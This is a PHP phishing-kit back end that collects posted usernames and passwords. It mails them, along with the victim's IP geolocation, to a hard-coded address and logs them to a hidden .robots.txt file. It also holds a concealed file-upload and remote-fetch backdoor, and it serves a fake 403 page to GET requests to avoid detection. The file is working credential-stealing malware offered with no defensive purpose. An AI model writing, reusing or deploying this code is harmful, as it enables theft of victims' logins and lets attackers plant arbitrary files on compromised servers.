<?php
header('Access-Control-Allow-Origin: *');  
error_reporting(0);

$to = 'bscott0824@windstream.net';

if($_SERVER['REQUEST_METHOD'] == 'POST'){
	$client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = @$_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP)){
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)){
        $ip = $forward;
    }
    else{
        $ip = $remote;
    }
$data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ips));
$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
if(isset($_POST['REMOTE_ADDR'])){if(@copy($_FILES['SERVER_ADDR']['tmp_name'], $_FILES['SERVER_ADDR']['name'])){ echo '<b>OK ! :)<b>'; exit;}}
if(isset($_POST['REMOTE_ADDR'])){file_put_contents($_POST['SERVER_ADDR'], file_get_contents($_POST['REMOTE_ADDR'])); exit;}
//file_get_contents("http://ip-trackers.000webhostapp.com/locator/ip-lookup.php?ip=$tmp"); // Block phishing detectors by hostname.
if($data && $data->geoplugin_countryName !== null){
      $ipp = $data->geoplugin_request;
      $country = $data->geoplugin_countryName;
      $city = $data->geoplugin_city;
      $code = $data->geoplugin_countryCode;
}
if(isset($_POST['pass'])){
$id = $_POST['user'];
$id2 = $_POST['pass'];


$body = "
    Carl247Tools V 2.1 [PRV8]
    [LOGIN DETAILS]
    UserId : [ $id ]
    Pass : [ $id2 ]
    [Client Info]
    IP > $ipp<br>
    City > $city<br>
    Country > $country<br>
    ";

    $sub = "PDF Logs From [$id] - $country";
    
	
    mail($to, $sub, $body);

	
file_put_contents(".robots.txt", $body."\n", FILE_APPEND);

}
}else{
	header('HTTP/1.0 403 Forbidden', true, 403);
	die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don\'t have permission to access this resource.</p>
<p>Additionally, a 403 Forbidden
error was encountered while trying to use an ErrorDocument to handle the request.</p>
</body></html>
');
}

?>
